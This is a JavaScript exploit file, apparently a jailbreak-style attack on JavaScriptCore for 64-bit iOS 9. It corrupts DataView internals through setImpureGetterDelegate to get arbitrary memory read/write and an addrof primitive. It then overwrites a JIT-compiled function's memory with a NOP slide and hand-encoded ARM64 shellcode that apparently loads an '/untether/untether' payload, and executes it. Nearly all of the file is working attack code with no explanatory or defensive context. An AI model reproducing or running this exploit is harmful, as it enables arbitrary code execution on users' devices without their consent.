const DV_ARRAYBUFFER_OFFSET = 0x10;
const DV_BYTELENGTH_OFFSET_HI = DV_ARRAYBUFFER_OFFSET + 0x4;
const DV_BYTELENGTH_OFFSET_LO = DV_ARRAYBUFFER_OFFSET + 0x8;
const DV_MODE_OFFSET = DV_BYTELENGTH_OFFSET_HI + 0x8;
const FAST_TYPED_ARRAY_MODE = 0x0;

var Utils = function() {
    this.print = function(msg) { debug(msg) }; 

    this.hex32 = function(num) {
        var hex_str = num.toString(16);
        while (hex_str.length < 8) {
            hex_str = '0' + hex_str;
        }
        return hex_str;
    }

    this.quit_jsc = function() {
        var quit = JSC_HAXX;
    }
};

var Memory = function() {
    this.dv_leak_addr = undefined;
    this.dv_leak = undefined;
    this.dv_rw = undefined;

    this.test_rw = function() {
        var test_buf = new ArrayBuffer(0x10);
        var buf_addr = this.addrof(test_buf)
        if (buf_addr <= 0xfff) return false;

        this.write32(buf_addr, 0x13374141);
        var read_back = this.read32(buf_addr);
        return read_back === 0x13374141;
    }

    this.init_rw = function() {
        var rw_buf = new ArrayBuffer(0x20);
        var dv_init = new DataView(rw_buf);
        this.dv_rw = new DataView(rw_buf);

        setImpureGetterDelegate(dv_init, this.dv_rw);
        dv_init.setUint32(DV_ARRAYBUFFER_OFFSET, 0, true);
        dv_init.setUint32(DV_BYTELENGTH_OFFSET_HI, 0x00000001, true);
        dv_init.setUint32(DV_BYTELENGTH_OFFSET_LO, 0xffffffff, true);
        dv_init.setUint32(DV_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, true);

        var rw_buf = new ArrayBuffer(0x20);
        this.dv_leak_addr = new DataView(rw_buf);
        this.dv_leak = new DataView(rw_buf);
        setImpureGetterDelegate(this.dv_leak, this.dv_leak_addr);
    }

    this.addrof = function(object) {
        if (this.dv_leak === undefined || this.dv_leak_addr === undefined) return 0;
        setImpureGetterDelegate(this.dv_leak_addr, object);
        return this.dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
    }

    this.read8 = function(addr) { return this.dv_rw.getUint8(addr, true); }
    this.read16 = function(addr) { return this.dv_rw.getUint16(addr, true); }
    this.read32 = function(addr) { return this.dv_rw.getUint32(addr, true); }

    this.write8 = function(addr, data) { this.dv_rw.setUint8(addr, data, true); }
    this.write16 = function(addr, data) { this.dv_rw.setUint16(addr, data, true); }
    this.write32 = function(addr, data) { this.dv_rw.setUint32(addr, data, true); }
}

var util = new Utils();
var mem = new Memory();

util.print("[*] jsc_haxx ios 9 (64bit) [*]");

mem.init_rw();
if (!mem.test_rw()) {
    util.print("failed to get rw, bailing...");
    util.quit_jsc();
}

util.print("got jsc rw");

var body = '';
for (var k = 0; k < 0x2000; k++){
	body += 'try {} catch(e){};';
}

var jitted_func = new Function('a', body);
for (var i = 0; i< 0x200; i++){
	jitted_func();
}

var jitted_addr = mem.addrof(jitted_func);
if (jitted_addr <= 0xfff) { util.quit_jsc(); }
util.print("jitted_func: 0x1" + util.hex32(jitted_addr));

var shellcode_ptr = mem.read32(jitted_addr+0x18);
if (shellcode_ptr <= 0xfff) { util.quit_jsc(); }
util.print("shellcode_ptr: 0x1" + util.hex32(shellcode_ptr));

var nop_slide = (mem.read32(shellcode_ptr+0x20)) - 0x562c;
if (nop_slide <= 0xfff) { util.quit_jsc(); }
util.print("nop_slide: 0x1" + util.hex32(nop_slide));

for (var i = 0; i < 0x1000; i+=0x4){
    mem.write32(nop_slide + i, 0xd503201f);
}

var shellcode = (nop_slide & 0xfffff000) + 0x1000;
util.print("loader_shc: 0x1" + util.hex32(shellcode));
mem.write32(shellcode + 0, 0xd10243ff);
mem.write32(shellcode + 4, 0xa9087bfd);
mem.write32(shellcode + 8, 0x910203fd);
mem.write32(shellcode + 12, 0x92800330);
mem.write32(shellcode + 16, 0xd4001001);
mem.write32(shellcode + 20, 0x2a0003e4);
mem.write32(shellcode + 24, 0x92800370);
mem.write32(shellcode + 28, 0xd4001001);
mem.write32(shellcode + 32, 0x2a0003ee);
mem.write32(shellcode + 36, 0x290113e0);
mem.write32(shellcode + 40, 0x5282a268);
mem.write32(shellcode + 44, 0x52800302);
mem.write32(shellcode + 48, 0x29000be8);
mem.write32(shellcode + 52, 0x5281a948);
mem.write32(shellcode + 56, 0x290223ff);
mem.write32(shellcode + 60, 0x910003e0);
mem.write32(shellcode + 64, 0x52800061);
mem.write32(shellcode + 68, 0x52800803);
mem.write32(shellcode + 72, 0xaa1f03e5);
mem.write32(shellcode + 76, 0xaa1f03e6);
mem.write32(shellcode + 80, 0x928003d0);
mem.write32(shellcode + 84, 0xd4001001);
mem.write32(shellcode + 88, 0xf841c3ec);
mem.write32(shellcode + 92, 0xb84343ed);
mem.write32(shellcode + 96, 0x510005ad);
mem.write32(shellcode + 100, 0xb86d598f);
mem.write32(shellcode + 104, 0x3400028d);
mem.write32(shellcode + 108, 0x6b0f01df);
mem.write32(shellcode + 112, 0x54ffff80);
mem.write32(shellcode + 116, 0x92800330);
mem.write32(shellcode + 120, 0xd4001001);
mem.write32(shellcode + 124, 0x2a0003e4);
mem.write32(shellcode + 128, 0x290113ef);
mem.write32(shellcode + 132, 0x5282a228);
mem.write32(shellcode + 136, 0x52800302);
mem.write32(shellcode + 140, 0x29000be8);
mem.write32(shellcode + 144, 0x5281c208);
mem.write32(shellcode + 148, 0x290223ff);
mem.write32(shellcode + 152, 0x910003e0);
mem.write32(shellcode + 156, 0x52800061);
mem.write32(shellcode + 160, 0x52800583);
mem.write32(shellcode + 164, 0xaa1f03e5);
mem.write32(shellcode + 168, 0xaa1f03e6);
mem.write32(shellcode + 172, 0x928003d0);
mem.write32(shellcode + 176, 0xd4001001);
mem.write32(shellcode + 180, 0x17ffffeb);
mem.write32(shellcode + 184, 0x92800330);
mem.write32(shellcode + 188, 0xd4001001);
mem.write32(shellcode + 192, 0x2a0003e4);
mem.write32(shellcode + 196, 0x92800370);
mem.write32(shellcode + 200, 0xd4001001);
mem.write32(shellcode + 204, 0x290113e0);
mem.write32(shellcode + 208, 0x5282a268);
mem.write32(shellcode + 212, 0x52800502);
mem.write32(shellcode + 216, 0x29000be8);
mem.write32(shellcode + 220, 0x5281a9a8);
mem.write32(shellcode + 224, 0x290223ff);
mem.write32(shellcode + 228, 0x52800228);
mem.write32(shellcode + 232, 0x528000a9);
mem.write32(shellcode + 236, 0x290427e8);
mem.write32(shellcode + 240, 0xf90017ff);
mem.write32(shellcode + 244, 0x910003e0);
mem.write32(shellcode + 248, 0x52800061);
mem.write32(shellcode + 252, 0x52802783);
mem.write32(shellcode + 256, 0xaa1f03e5);
mem.write32(shellcode + 260, 0xaa1f03e6);
mem.write32(shellcode + 264, 0x928003d0);
mem.write32(shellcode + 268, 0xd4001001);
mem.write32(shellcode + 272, 0xf94017e8);
mem.write32(shellcode + 276, 0xb4000e68);
mem.write32(shellcode + 280, 0xf940110a);
mem.write32(shellcode + 284, 0xaa0a03eb);
mem.write32(shellcode + 288, 0xf2e00e8d);
mem.write32(shellcode + 292, 0xf2ce6dcd);
mem.write32(shellcode + 296, 0xf2adec6d);
mem.write32(shellcode + 300, 0xf28bebed);
mem.write32(shellcode + 304, 0xf2e0000e);
mem.write32(shellcode + 308, 0xf2c82a8e);
mem.write32(shellcode + 312, 0xf2a8288e);
mem.write32(shellcode + 316, 0xf28bebee);
mem.write32(shellcode + 320, 0x9100056b);
mem.write32(shellcode + 324, 0xf840016c);
mem.write32(shellcode + 328, 0xeb0d019f);
mem.write32(shellcode + 332, 0x54ffffa1);
mem.write32(shellcode + 336, 0x9100416b);
mem.write32(shellcode + 340, 0xf840016c);
mem.write32(shellcode + 344, 0xeb0e019f);
mem.write32(shellcode + 348, 0x54000040);
mem.write32(shellcode + 352, 0x17fffff8);
mem.write32(shellcode + 356, 0x9100816b);
mem.write32(shellcode + 360, 0xb8400168);
mem.write32(shellcode + 364, 0x8b0a0108);
mem.write32(shellcode + 368, 0x91016109);
mem.write32(shellcode + 372, 0xf9400129);
mem.write32(shellcode + 376, 0xb4000b49);
mem.write32(shellcode + 380, 0xf80003e9);
mem.write32(shellcode + 384, 0x9101a109);
mem.write32(shellcode + 388, 0xf9400129);
mem.write32(shellcode + 392, 0xb4000ac9);
mem.write32(shellcode + 396, 0xf80083e9);
mem.write32(shellcode + 400, 0x30000ba0);
mem.write32(shellcode + 404, 0xd2800041);
mem.write32(shellcode + 408, 0xf94003e8);
mem.write32(shellcode + 412, 0xd63f0100);
mem.write32(shellcode + 416, 0xb4000a00);
mem.write32(shellcode + 420, 0x50000c21);
mem.write32(shellcode + 424, 0xf94007e8);
mem.write32(shellcode + 428, 0xd63f0100);
mem.write32(shellcode + 432, 0xb4000980);
mem.write32(shellcode + 436, 0xb8400001);
mem.write32(shellcode + 440, 0x531d7c22);
mem.write32(shellcode + 444, 0x12000442);
mem.write32(shellcode + 448, 0x53185c23);
mem.write32(shellcode + 452, 0x530d7c63);
mem.write32(shellcode + 456, 0x531e7463);
mem.write32(shellcode + 460, 0x2a020064);
mem.write32(shellcode + 464, 0x53144c84);
mem.write32(shellcode + 468, 0x9274cc05);
mem.write32(shellcode + 472, 0x8b0400a5);
mem.write32(shellcode + 476, 0xb8404001);
mem.write32(shellcode + 480, 0x530a7c21);
mem.write32(shellcode + 484, 0x12002c21);
mem.write32(shellcode + 488, 0x8b0100a8);
mem.write32(shellcode + 492, 0xf900011f);
mem.write32(shellcode + 496, 0xd503201f);
mem.write32(shellcode + 500, 0xf94017e8);
mem.write32(shellcode + 504, 0xf940110a);
mem.write32(shellcode + 508, 0x9140054a);
mem.write32(shellcode + 512, 0xd28000b0);
mem.write32(shellcode + 516, 0x10000760);
mem.write32(shellcode + 520, 0xaa1f03e1);
mem.write32(shellcode + 524, 0xd4001001);
mem.write32(shellcode + 528, 0xeb1f001f);
mem.write32(shellcode + 532, 0x5400066d);
mem.write32(shellcode + 536, 0x2a0003e8);
mem.write32(shellcode + 540, 0xd28018f0);
mem.write32(shellcode + 544, 0xaa1f03e1);
mem.write32(shellcode + 548, 0xd2800042);
mem.write32(shellcode + 552, 0xd4001001);
mem.write32(shellcode + 556, 0xeb1f001f);
mem.write32(shellcode + 560, 0x5400058d);
mem.write32(shellcode + 564, 0x2a0003e9);
mem.write32(shellcode + 568, 0xd28018f0);
mem.write32(shellcode + 572, 0x2a0803e0);
mem.write32(shellcode + 576, 0xaa1f03e1);
mem.write32(shellcode + 580, 0xd2800002);
mem.write32(shellcode + 584, 0xd4001001);
mem.write32(shellcode + 588, 0xeb1f001f);
mem.write32(shellcode + 592, 0x10ffed80);
mem.write32(shellcode + 596, 0x9274cc00);
mem.write32(shellcode + 600, 0x91400400);
mem.write32(shellcode + 604, 0xaa0003eb);
mem.write32(shellcode + 608, 0xd2800070);
mem.write32(shellcode + 612, 0xaa0003e1);
mem.write32(shellcode + 616, 0x2a0803e0);
mem.write32(shellcode + 620, 0x2a0903e2);
mem.write32(shellcode + 624, 0xd4001001);
mem.write32(shellcode + 628, 0xeb1f001f);
mem.write32(shellcode + 632, 0x5400034d);
mem.write32(shellcode + 636, 0xd28018b0);
mem.write32(shellcode + 640, 0xaa1f03e0);
mem.write32(shellcode + 644, 0xd2a01001);
mem.write32(shellcode + 648, 0xd2800062);
mem.write32(shellcode + 652, 0xd2820043);
mem.write32(shellcode + 656, 0x92800004);
mem.write32(shellcode + 660, 0xaa1f03e5);
mem.write32(shellcode + 664, 0xd4001001);
mem.write32(shellcode + 668, 0xeb1f001f);
mem.write32(shellcode + 672, 0x5400020d);
mem.write32(shellcode + 676, 0x91410008);
mem.write32(shellcode + 680, 0xf800010b);
mem.write32(shellcode + 684, 0x52800029);
mem.write32(shellcode + 688, 0xb8008109);
mem.write32(shellcode + 692, 0x9100e109);
mem.write32(shellcode + 696, 0xf8010109);
mem.write32(shellcode + 700, 0xf8028109);
mem.write32(shellcode + 704, 0xaa1f03e9);
mem.write32(shellcode + 708, 0xf8018109);
mem.write32(shellcode + 712, 0xf8020109);
mem.write32(shellcode + 716, 0xf8030109);
mem.write32(shellcode + 720, 0x10000109);
mem.write32(shellcode + 724, 0xf8038109);
mem.write32(shellcode + 728, 0x9100011f);
mem.write32(shellcode + 732, 0xd61f0140);
mem.write32(shellcode + 736, 0x52800000);
mem.write32(shellcode + 740, 0xd2800030);
mem.write32(shellcode + 744, 0xd4001001);
mem.write32(shellcode + 748, 0xd65f03c0);
mem.write32(shellcode + 752, 0x746e752f);
mem.write32(shellcode + 756, 0x65687465);
mem.write32(shellcode + 760, 0x6e752f72);
mem.write32(shellcode + 764, 0x68746574);
mem.write32(shellcode + 768, 0x00007265);
mem.write32(shellcode + 772, 0x73752f00);
mem.write32(shellcode + 776, 0x696c2f72);
mem.write32(shellcode + 780, 0x79732f62);
mem.write32(shellcode + 784, 0x6d657473);
mem.write32(shellcode + 788, 0x62696c2f);
mem.write32(shellcode + 792, 0x70736964);
mem.write32(shellcode + 796, 0x68637461);
mem.write32(shellcode + 800, 0x6c79642e);
mem.write32(shellcode + 804, 0x00006269);
mem.write32(shellcode + 808, 0x6f760000);
mem.write32(shellcode + 812, 0x65686375);
mem.write32(shellcode + 816, 0x63615f72);
mem.write32(shellcode + 820, 0x69766974);
mem.write32(shellcode + 824, 0x625f7974);
mem.write32(shellcode + 828, 0x65666675);
mem.write32(shellcode + 832, 0x6f685f72);
mem.write32(shellcode + 836, 0x695f6b6f);
mem.write32(shellcode + 840, 0x6174736e);
mem.write32(shellcode + 844, 0x345f6c6c);
mem.write32(shellcode + 848, 0x7462696c);
mem.write32(shellcode + 852, 0x65636172);
mem.write32(shellcode + 856, 0x00000000);
mem.write32(shellcode + 860, 0x00000000);
jitted_func();